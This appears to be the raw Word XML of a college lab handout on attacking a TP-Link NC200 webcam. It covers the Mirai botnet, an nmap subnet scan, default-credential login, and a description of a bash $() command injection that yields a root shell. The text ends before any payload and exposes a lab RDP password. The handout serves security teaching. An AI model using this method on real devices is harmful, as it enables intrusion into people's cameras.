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2D8F" w14:textId="1C87561F" w:rsidR="00A019F3" w:rsidRDefault="00B77ED4" w:rsidP="00FE0EB7">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc197157045"/>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebCam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00435B53">
        <w:t xml:space="preserve"> Hacking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13717633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013F377" w14:textId="56C4CDF8" w:rsidR="00FA3073" w:rsidRDefault="00FA3073">
          <w:pPr>
            <w:pStyle w:val="TOCHeading"/>
          </w:pPr>
          <w:r>
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="178450FC" w14:textId="37448933" w:rsidR="001E26FD" w:rsidRDefault="00FA30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57045" w:history="1">
            <w:r w:rsidR="001E26FD" w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS"/>
                <w:noProof/>
              </w:rPr>
              <w:t>WebCam Hacking</w:t>
            </w:r>
            <w:r w:rsidR="001E26FD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="001E26FD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="001E26FD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc197157045 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="001E26FD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="001E26FD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="001E26FD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="001E26FD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4A239D5A" w14:textId="50DF2476" w:rsidR="001E26FD" w:rsidRDefault="001E26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157046" w:history="1">
            <w:r w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Marai Botnet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5C50" w14:textId="2A649ADB" w:rsidR="001E26FD" w:rsidRDefault="001E26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157047" w:history="1">
            <w:r w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Assignment 1: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4200" w14:textId="29FDB15A" w:rsidR="001E26FD" w:rsidRDefault="001E26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157048" w:history="1">
            <w:r w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Logon to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EB24" w14:textId="65F2C148" w:rsidR="001E26FD" w:rsidRDefault="001E26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157049" w:history="1">
            <w:r w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Find the WebCam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A8B6" w14:textId="133F6F58" w:rsidR="001E26FD" w:rsidRDefault="001E26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157050" w:history="1">
            <w:r w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Factory Default the WebCam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FF7F" w14:textId="1B79CD99" w:rsidR="001E26FD" w:rsidRDefault="001E26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157051" w:history="1">
            <w:r w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Bash Injection Web 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7983" w14:textId="61171C9F" w:rsidR="001E26FD" w:rsidRDefault="001E26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157052" w:history="1">
            <w:r w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Hack the WebCam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7048" w14:textId="17A61E97" w:rsidR="001E26FD" w:rsidRDefault="001E26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157053" w:history="1">
            <w:r w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Assignment 2: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3DE5" w14:textId="0A711A90" w:rsidR="001E26FD" w:rsidRDefault="001E26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157054" w:history="1">
            <w:r w:rsidRPr="00C5191A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Arial Unicode MS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01FC" w14:textId="36AE3576" w:rsidR="00FA3073" w:rsidRDefault="00FA3073">
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="0657AB6F" w14:textId="0084540D" w:rsidR="00A12D22" w:rsidRDefault="00A12D22" w:rsidP="0024622F">
      <w:r>
        <w:t xml:space="preserve">Time required: </w:t>
      </w:r>
      <w:r w:rsidR="00FA3073">
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:t>0 minutes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5864B0" w14:textId="3EA0E68B" w:rsidR="00CF504F" w:rsidRDefault="008C6651" w:rsidP="0024622F">
      <w:r>
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r w:rsidR="00E61680">
        <w:t xml:space="preserve">attack </w:t>
      </w:r>
      <w:r>
        <w:t>lab is meant to be performed from Kali Li</w:t>
      </w:r>
      <w:r w:rsidR="007F2270">
        <w:t>nux on a TP-Link NC200 webcam.</w:t>
      </w:r>
      <w:r w:rsidR="00E6460B">
        <w:t xml:space="preserve"> The webcam has vulnerable firmware</w:t>
      </w:r>
      <w:r w:rsidR="003960B8">
        <w:t xml:space="preserve">, which is </w:t>
      </w:r>
      <w:r w:rsidR="00090648">
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="003960B8">
        <w:t xml:space="preserve"> miniature Linux kernel</w:t>
      </w:r>
      <w:r w:rsidR="002E059F">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="002E059F" w:rsidRPr="002E059F">
        <w:t xml:space="preserve">TP-LINK NC200 and NC220 Cloud IP Cameras, which promise to let consumers “see there, when you can’t be there,” are vulnerable to an OS command injection in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E059F" w:rsidRPr="002E059F">
        <w:t>PPPoE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E059F" w:rsidRPr="002E059F">
        <w:t xml:space="preserve"> username and password settings. An attacker can leverage this weakness to get a remote shell with root privileges.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D7F2D26" w14:textId="7A6D880E" w:rsidR="004D007D" w:rsidRDefault="004D007D" w:rsidP="004D007D">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc197157046"/>
      <w:r>
        <w:t>Marai Botnet</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="3E5E0102" w14:textId="116AD983" w:rsidR="004D007D" w:rsidRDefault="00BF18EC" w:rsidP="0024622F">
      <w:r>
        <w:t>Th</w:t>
      </w:r>
      <w:r w:rsidR="004D007D">
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> webcam attack </w:t>
      </w:r>
      <w:r w:rsidR="00542E2C">
        <w:t>in this lab was</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> automated and used to launch DDOS attacks</w:t>
      </w:r>
      <w:r w:rsidR="00542E2C">
        <w:t xml:space="preserve"> on DNS providers in 2016</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="161BA9F4" w14:textId="55E04806" w:rsidR="00632618" w:rsidRDefault="004D007D" w:rsidP="000570B5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidRPr="00087125">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://techcrunch.com/2016/10/24/webcams-involved-in-dyn-ddos-attack-recalled/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00BF18EC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A124E8D" w14:textId="42FC62E7" w:rsidR="000570B5" w:rsidRDefault="000570B5" w:rsidP="000570B5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId9" w:history="1">
        <w:r w:rsidRPr="00087125">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.cloudflare.com/learning/ddos/glossary/mirai-botnet/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D3EF7C" w14:textId="0A84609F" w:rsidR="00FA2B9E" w:rsidRDefault="00FA2B9E" w:rsidP="004B0062">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc197157047"/>
      <w:r>
        <w:t>Assignment 1: Reflection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
      <w:r w:rsidR="004B0062">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9F4542" w14:textId="075A27A7" w:rsidR="00FA2B9E" w:rsidRDefault="004B0062" w:rsidP="00FA2B9E">
      <w:r>
        <w:t xml:space="preserve">After reading through the above web site. </w:t>
      </w:r>
      <w:r w:rsidR="00FA2B9E">
        <w:t>Please write 200 words about what you think about this type of attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EFD2721" w14:textId="28AFE91E" w:rsidR="004B0062" w:rsidRDefault="004B0062" w:rsidP="00FA2B9E">
      <w:r>
        <w:t>Attach to this assignment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157E4F0C" w14:textId="77777777" w:rsidR="00FA2B9E" w:rsidRDefault="00FA2B9E" w:rsidP="00FA2B9E"/>
    <w:p w14:paraId="00351BEB" w14:textId="271F3F8B" w:rsidR="003F15E4" w:rsidRDefault="00FA4AD4" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc164244561"/>
      <w:bookmarkStart w:id="4" w:name="_Toc197157048"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4D20D2E5" wp14:editId="3F01477D">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>3146425</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>275590</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="3099816" cy="1929384"/>
            <wp:effectExtent l="38100" t="38100" r="100965" b="90170"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="1805255227" name="Picture 18052552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5227" name="Picture 180525522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192938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15E4">
        <w:t>Logon to Kali Linux</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="107CAE9C" w14:textId="5A5C6F1B" w:rsidR="003F15E4" w:rsidRDefault="003F15E4" w:rsidP="003F15E4">
      <w:r>
        <w:t>You will be logging into an older Dell laptop computer in D1 at the WNCC Scottsbluff campus. Please be patient!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A435EE8" w14:textId="77777777" w:rsidR="003F15E4" w:rsidRDefault="003F15E4" w:rsidP="003F15E4">
      <w:r>
        <w:t xml:space="preserve">You will use </w:t>
      </w:r>
      <w:r w:rsidRPr="009664C5">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Remote Desktop Connection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on your Windows computer (not the virtual machine) to connect to the remote Kali Linux laptop.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259CB006" w14:textId="77777777" w:rsidR="003F15E4" w:rsidRDefault="003F15E4" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Go to </w:t>
      </w:r>
      <w:r w:rsidRPr="00430921">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Start, </w:t>
      </w:r>
      <w:r w:rsidRPr="007D2723">
        <w:t xml:space="preserve">type </w:t>
      </w:r>
      <w:r w:rsidRPr="00430921">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remote Desktop Connection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071995A1" w14:textId="77777777" w:rsidR="003F15E4" w:rsidRDefault="003F15E4" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00397ACB">
        <w:t>Computer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from outside D1</w:t>
      </w:r>
      <w:r w:rsidRPr="00397ACB">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00430921">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> lab.wncc.edu:339</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="00397ACB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">In D1: </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE3F82">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>172.16.1.3:3390</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8DF70F" w14:textId="77777777" w:rsidR="003F15E4" w:rsidRPr="00504D82" w:rsidRDefault="003F15E4" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Username: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104BF5C9" w14:textId="77777777" w:rsidR="003F15E4" w:rsidRDefault="003F15E4" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Password: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ToweringFence2344</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5211766D" w14:textId="77777777" w:rsidR="00AD0187" w:rsidRDefault="00AD0187" w:rsidP="0004148C">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc197157049"/>
      <w:r>
        <w:t xml:space="preserve">Find the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebCam</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="02F90DAA" w14:textId="295E333F" w:rsidR="008A72CA" w:rsidRDefault="008A72CA" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To determine your local network address, type </w:t>
      </w:r>
      <w:r w:rsidRPr="00495820">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidR="00583765">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and then press Enter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278DF2F9" w14:textId="0B83FE23" w:rsidR="008A72CA" w:rsidRPr="005E407E" w:rsidRDefault="008A72CA" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To determine your gateway IP address, type </w:t>
      </w:r>
      <w:r w:rsidRPr="00495820">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>route -n</w:t>
      </w:r>
      <w:r w:rsidR="00380750" w:rsidRPr="00380750">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> and press Enter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54BF0666" w14:textId="146DE189" w:rsidR="006115BE" w:rsidRDefault="006115BE" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Example: If your default gateway is 192.168.1.1, use</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Target: 192.168.1.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8C8C9E" w14:textId="77777777" w:rsidR="00FF3FEB" w:rsidRDefault="00174490" w:rsidP="00174490">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>To scan the network:</w:t>
      </w:r>
      <w:r w:rsidR="00FF3FE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FEB" w14:paraId="71945BD8" w14:textId="77777777" w:rsidTr="00DE716A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF1DD" w:themeFill="accent3" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="213E6423" w14:textId="22E4D02B" w:rsidR="00FF3FEB" w:rsidRPr="00277DD7" w:rsidRDefault="00FF3FEB" w:rsidP="00DE716A">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00277DD7">
              <w:t>nmap</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00277DD7">
              <w:t xml:space="preserve"> -T4 -F X.X.X.0/24</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F65558A" w14:textId="3C851C49" w:rsidR="006115BE" w:rsidRPr="00AD0187" w:rsidRDefault="00801642" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The w</w:t>
      </w:r>
      <w:r w:rsidR="009B3A17">
        <w:t>eb</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="009B3A17">
        <w:t xml:space="preserve">am </w:t>
      </w:r>
      <w:r w:rsidR="00C16706">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F87EEA">
        <w:t>Tp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F87EEA">
        <w:t>-Link</w:t>
      </w:r>
      <w:r w:rsidR="00C16706">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00F87EEA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009B3A17">
        <w:t xml:space="preserve">should show up </w:t>
      </w:r>
      <w:r w:rsidR="005B1FDD">
        <w:t>with</w:t>
      </w:r>
      <w:r w:rsidR="004B5BAF">
        <w:t xml:space="preserve"> ports 80 and 8080 open.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4C1A0D" w14:textId="2BDF9013" w:rsidR="003101BB" w:rsidRDefault="008C14A2" w:rsidP="008C14A2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc197157050"/>
      <w:r>
        <w:t xml:space="preserve">Factory Default the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebCam</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7202C6E5" w14:textId="18C30965" w:rsidR="00A16ABF" w:rsidRDefault="00A16ABF" w:rsidP="00A16ABF">
      <w:r>
        <w:t xml:space="preserve">We will use a </w:t>
      </w:r>
      <w:r w:rsidRPr="0032159F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bash</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0032159F">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0032159F">
        <w:t>bourne</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0032159F">
        <w:t xml:space="preserve"> again shell) </w:t>
      </w:r>
      <w:r>
        <w:t>injection attack.</w:t>
      </w:r>
      <w:r w:rsidR="00456A84">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0032159F" w:rsidRPr="0032159F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bash</w:t>
      </w:r>
      <w:r w:rsidR="0032159F">
        <w:t xml:space="preserve"> is the default command line shell for many Linux distributions. </w:t>
      </w:r>
      <w:r w:rsidR="00456A84">
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00456A84" w:rsidRPr="009945C1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>$()</w:t>
      </w:r>
      <w:r w:rsidR="00456A84">
        <w:t xml:space="preserve"> allows us to bypass the web interface and interact directly with the </w:t>
      </w:r>
      <w:r w:rsidR="004B6B34">
        <w:t xml:space="preserve">underlying </w:t>
      </w:r>
      <w:r w:rsidR="00195F36">
        <w:t>Linux</w:t>
      </w:r>
      <w:r w:rsidR="00456A84">
        <w:t xml:space="preserve"> OS running the webcam.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9524A4" w14:textId="4CE51410" w:rsidR="00CB51E7" w:rsidRPr="00A16ABF" w:rsidRDefault="00CB51E7" w:rsidP="00A16ABF">
      <w:r w:rsidRPr="00CB51E7">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NOTE:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> If you get a message a New software version is available</w:t>
      </w:r>
      <w:r w:rsidR="00BF295D">
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00020A6B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Cancel</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66DA7C60" w14:textId="2B9439C0" w:rsidR="001C5B95" w:rsidRDefault="00801857" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidR="00533BBE">
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00493C07">
        <w:t>Web B</w:t>
      </w:r>
      <w:r>
        <w:t>rowser to logon to the webcam’s IP address.</w:t>
      </w:r>
      <w:r w:rsidR="001C5B95">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001C5B95" w:rsidRPr="001C5B95">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001C5B95" w:rsidRPr="001C5B95">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ipaddress</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001C5B95" w:rsidRPr="001C5B95">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>}/index.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1D96A6" w14:textId="77777777" w:rsidR="009E4751" w:rsidRDefault="00710427" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It should say </w:t>
      </w:r>
      <w:r w:rsidRPr="001E5828">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TP-LINK</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4196578B" w14:textId="4D9C8817" w:rsidR="00897B62" w:rsidRDefault="00801857" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Look up the default username and password</w:t>
      </w:r>
      <w:r w:rsidR="00897B62">
        <w:t xml:space="preserve"> of the device you are connecting to</w:t>
      </w:r>
      <w:r w:rsidR="009E4751">
        <w:t xml:space="preserve"> on Google.</w:t>
      </w:r>
      <w:r w:rsidR="00E97E1C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E97E1C" w:rsidRPr="00E97E1C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TP-Link NC200</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5DB18E" w14:textId="5174E69C" w:rsidR="003D6903" w:rsidRDefault="003D6903" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Login to the device.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47ABA5AF" w14:textId="3E75A060" w:rsidR="00801857" w:rsidRDefault="00C246EF" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Click Cancel</w:t>
      </w:r>
      <w:r w:rsidR="00891CE8">
        <w:t xml:space="preserve"> on the following screen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACDA0EB" w14:textId="4C592433" w:rsidR="00C246EF" w:rsidRDefault="00C246EF" w:rsidP="006903F5">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
